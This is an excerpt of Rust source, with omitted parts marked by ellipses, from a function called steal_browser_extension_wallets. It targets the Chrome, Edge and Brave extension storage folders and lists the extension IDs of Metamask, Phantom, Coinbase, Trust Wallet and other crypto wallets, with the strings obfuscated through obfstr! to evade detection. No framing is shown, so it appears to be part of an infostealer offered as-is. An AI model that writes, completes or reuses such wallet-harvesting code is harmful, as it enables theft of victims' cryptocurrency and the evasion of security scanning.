...
fn steal_browser_extension_wallets() -> Vec<WalletData> {
    ...
    let browser_paths = vec![
        (
            r"Google\Chrome\User Data\Default\Local Extension Settings",
            "Chrome",
        ),
        (
            r"Microsoft\Edge\User Data\Default\Local Extension Settings",
            "Edge",
        ),
        (
            r"BraveSoftware\Brave-Browser\User Data\Default\Local Extension Settings",
            "Brave",
        ),
    ];
    ...
    for (browser_path, browser_name) in browser_paths {
        ...
        let wallet_extensions = vec![
            (
                obfstr!("nkbihfbeogaeaoehlefnkodbefgpgknn").to_string(),
                obfstr!("Metamask").to_string(),
            ), // Metamask
            (
                obfstr!("bfnaelmomeimhlpmgjnjophhpkkoljpa").to_string(),
                obfstr!("Phantom").to_string(),
            ), // Phantom
            (
                obfstr!("fhbohimaelbohpjbbldcngcnapndodjp").to_string(),
                obfstr!("Binance Chain").to_string(),
            ), // Binance Chain Wallet
            (
                obfstr!("hnfanknocfeofbddgcijnmhnfnkdnaad").to_string(),
                obfstr!("Coinbase Wallet").to_string(),
            ), // Coinbase
            (
                obfstr!("afbcbjpbpfadlkmhmclhkeeodmamcflc").to_string(),
                obfstr!("Math Wallet").to_string(),
            ), // Math Wallet
            (
                obfstr!("egjidjbpglichdcondbcbdnbeeppgdph").to_string(),
                obfstr!("Trust Wallet").to_string(),
            ), // Trust Wallet
        ];
